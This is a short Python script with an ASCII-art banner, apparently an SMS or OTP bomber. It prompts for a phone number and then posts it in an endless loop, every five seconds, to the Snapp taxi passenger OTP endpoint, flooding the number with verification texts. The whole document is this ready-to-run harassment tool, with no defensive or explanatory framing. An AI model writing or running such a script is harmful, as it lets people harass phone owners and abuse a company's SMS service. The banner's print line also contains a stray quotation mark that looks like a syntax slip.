import requests
import time

print("""            _                  __       _   _               
  ___ _   _| |__   ___ _ __   / _| __ _| |_| |__   ___ _ __ 
 / __| | | | '_ \ / _ \ '__| | |_ / _` | __| '_ \ / _ \ '__|
| (__| |_| | |_) |  __/ |    |  _| (_| | |_| | | |  __/ |   
 \___|\__, |_.__/ \___|_|    |_|  \__,_|\__|_| |_|\___|_|   
      |___/                                                 
                                 """ ")
      
      
phnenum = input("Enter The Phone Number : ")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+phnenum}

while True :
     requests.post(urlsend,data=mydata)
     print("send")
     time.sleep(5)
